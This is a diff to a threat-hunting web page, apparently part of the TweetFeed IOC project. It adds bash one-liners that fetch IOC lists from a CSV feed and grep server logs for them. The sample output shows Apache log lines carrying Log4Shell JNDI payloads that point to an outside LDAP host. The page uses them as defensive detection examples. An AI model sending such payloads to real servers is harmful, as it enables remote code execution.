@@ -133,7 +133,7 @@
 							</a>
 							<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdownMenuLink" style="background: linear-gradient(#1DA1F2 0%, #1DA1F2 100%);">
 								<a class="dropdown-item" href="feeds.html"><i class="fas fa-rss"></i> Feeds</a>
-								<a class="dropdown-item" href="graphs.html"><i class="fas fa-chart-pie"></i> Graphs</a>								
+								<a class="dropdown-item" href="graphs.html"><i class="fas fa-chart-pie"></i> Graphs</a>
 								<a class="dropdown-item" href="researchers.html"><i class="fas fa-users"></i> Researchers</a>
 								<a class="dropdown-item" href="hunt.html"><i class="fas fa-shield-alt"></i> Hunt</a>
 								<a class="dropdown-item" href="https://twitter.com/i/lists/1423693426437001224" target="_blank"><i class="fab fa-twitter"></i> List</a>
@@ -152,10 +152,51 @@
 				</div>
 				<hr style="border: 1px solid black;"> <!-- DIVIDER -->
 				<ol style="font-size: 16px;">
+					<li><a href="hunt.html#bash" style="font-family: 'Segoe UI', Arial, sans-serif;color: #0000EE;font-weight: 600;">Bash commands examples</a></li>
 					<li><a href="hunt.html#microsoftHunt" style="font-family: 'Segoe UI', Arial, sans-serif;color: #0000EE;font-weight: 600;">Microsoft Defender for Endpoint (MDE)</a></li>
 				</ol>
+				<hr style="border: 1px solid black;" id="bash"> <!-- DIVIDER -->
+				<h1 style="color: #737373;font-weight: 600;">Bash commands examples</h1>
+				<!-- -->
+				<br>
+				<h5><b>1. Get raw IOCs by type (url / domain / ip / sha256 / md5)</b></h5>
+				Command:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
+				Example:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "url"' | cut -d, -f4 > suspicious_urls.dat</pre>
+				Output:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url1
+url1
+url3
+url4
+...</em></pre>
+				<!-- -->
+				<br>
+				<h5><b>2. Get raw IOCs by tag (phishing / malware / CobaltStrike / Log4Shell / ...)</b> <i style="font-size: 14px;" class="far fa-question-circle fa-sm align-self-center" data-toggle="tooltip" data-placement="top" title="All tags can be seen at 'About' section"></i></h5>
+				Command:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, 'tolower($5) ~ "<span style="color:gray;"><b>{tag}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
+				Example:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, 'tolower($5) ~ "CobaltStrike"' | cut -d, -f4 > iocs_CS.dat</pre>
+				Output:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>url
+md5
+ip
+domain
+sha256
+...</em></pre>
+				<!-- -->
+				<br>
+				<h5><b>3. Search IOCs in a file (e.g. log files)</b></h5>
+				Command:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 | while read line; do grep "$line" <span style="color:gray;"><b>{File}</b></span>;done</pre>
+				Example:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s https://raw.githubusercontent.com/0xDanielLopez/TweetFeed/master/today.csv | awk -F, '$3 == "ip"' | cut -d, -f4 | while read line; do grep "$line" /var/log/apache2/access.log;done</pre>
+				Output:
+				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2"><em>170.210.45.163 - - [16/Dec/2021:21:13:00 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 589 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
+170.210.45.163 - - [16/Dec/2021:21:13:01 +0000] "GET / HTTP/1.1" 301 509 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"
+170.210.45.163 - - [17/Dec/2021:01:48:06 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 5228 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
+170.210.45.163 - - [17/Dec/2021:01:48:07 +0000] "GET / HTTP/1.1" 301 5228 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"</em></pre>
 				<hr style="border: 1px solid black;" id="microsoftHunt"> <!-- DIVIDER -->
-
 				<h1 style="font-family: 'Segoe UI', Arial, sans-serif;color: #737373;font-weight: 600;">Microsoft Defender for Endpoint (MDE) <a style="background-color: 
 #00a1f1;border-color: black;font-size: 12px;" class="btn btn-primary btn-sm" href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-hunting-overview?view=o365-worldwide" target="_blank" role="button">More info <i class="fas fa-external-link-alt"></i></a></h1>
 				<p style="color: #737373;font-size: 16px;font-family: 'Rubik', sans-serif;">Some templates, modify them as you wish.</p>
@@ -353,7 +394,7 @@ union (
 			/* Get the text field */
 			var text = $(".tab-pane.active code").text()
 
-			var queryTextButton =$("#textQuery1").text()
+			var queryTextButton = $("#textQuery1").text()
 
 			/* Copy the text inside the text field */
 			navigator.clipboard.writeText(text);
@@ -365,15 +406,20 @@ union (
 			setTimeout(
 				function() {
 					$("#iconQuery1").removeClass("fas fa-check");
-					$("#iconQuery1").addClass("far fa-clipboard");					
+					$("#iconQuery1").addClass("far fa-clipboard");
 					$("#textQuery1").text(queryTextButton);
 					$("#buttonQuery1").css("background-color", "#4682B4");
 				}, 1000);
 		}
 
-		function changeCopyButton(number){
+		function changeCopyButton(number) {
 			$("#textQuery1").text("Copy #" + number + " to clipboard ");
 		}
+		</script>
+		<script>
+		$(function() {
+			$('[data-toggle="tooltip"]').tooltip()
+		})
 		</script>
 </body>
 
